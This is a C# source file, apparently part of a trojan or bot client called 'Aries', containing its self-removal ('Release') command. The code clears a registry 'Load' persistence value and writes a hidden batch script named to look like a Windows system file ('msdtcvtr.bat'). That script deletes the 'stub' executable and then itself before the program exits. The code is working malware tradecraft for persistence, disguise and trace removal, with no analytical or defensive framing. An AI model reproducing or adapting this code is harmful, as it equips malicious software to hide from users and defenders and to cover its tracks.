using System;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;

namespace mstsc.Aries.Commands
{
sealed class Release 
    {
        public Release()
        {
            try
            {
                DeleteLoadKey();

                if (File.Exists(Config.TemporaryFilesPath + Config.UpdateFileName)) { File.Delete(Config.TemporaryFilesPath + Config.UpdateFileName); }

                if (File.Exists(Config.TemporaryFilesPath + Config.File))
                {
                    //Create a batch script that will delete the stub and itself
                    using (StreamWriter BatchScriptWriter = new StreamWriter(Config.TemporaryFilesPath + "\\msdtcvtr.bat"))
                    {
                        //"taskkill /F /IM " + Config.File + " \n" +
                        //"ping 1.1.1.1 -n 1 -w 10000 >NUL \n" +
                        BatchScriptWriter.Write("@echo off \n" +
                            "del " + Config.File + "\n" +
                            "ping 1.1.1.1 -n 1 -w 3000 >NUL \n" +
                            "del \"%0\"");
                        BatchScriptWriter.Close();
                    }

                    //Run the created batch script and get out of here!
                    ProcessStartInfo BatchScript = new ProcessStartInfo(Config.TemporaryFilesPath + "\\msdtcvtr.bat");
                    BatchScript.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(BatchScript);
                    File.Delete(Config.TemporaryFilesPath + "\\" + Config.File);
                    Environment.Exit(-1);
                }
                DeleteLoadKey();
                Environment.Exit(-1);
                //GC.Collect();
            }
            catch (Exception)
            {
                //Delete the registry key and get out of here!
                //this.DeleteLoadKey();
                Environment.Exit(-1);
            }
        }

        private void DeleteLoadKey()
        {
            RegistryKey AriesRegistryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true);
            if (!(AriesRegistryKey.GetValue("Load").ToString() == "")) { AriesRegistryKey.SetValue("Load", ""); }
        }
    }
}
